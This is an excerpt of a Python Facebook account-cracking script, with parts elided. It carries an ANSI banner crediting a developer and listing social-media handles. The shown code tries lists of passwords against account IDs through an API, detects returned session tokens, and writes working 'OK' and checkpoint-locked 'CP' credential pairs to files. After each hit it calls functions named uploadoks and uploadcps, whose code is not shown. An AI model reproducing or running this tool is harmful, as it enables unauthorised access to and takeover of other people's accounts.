...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            Muhammad SiddeQ
     \033[1;91m➣ \033[1;92mFACEBOOK   :            SiddeQMaliK
     \033[1;93m➣ \033[1;92mWHATSAPP   :            030667861**
     \033[1;96m➣ \033[1;92mGITHUB     :            SiddeQ00
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Siddeq  ): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SiddeQ-oK %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [SiddeQ-oK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[SiddeQ-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SiddeQ-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
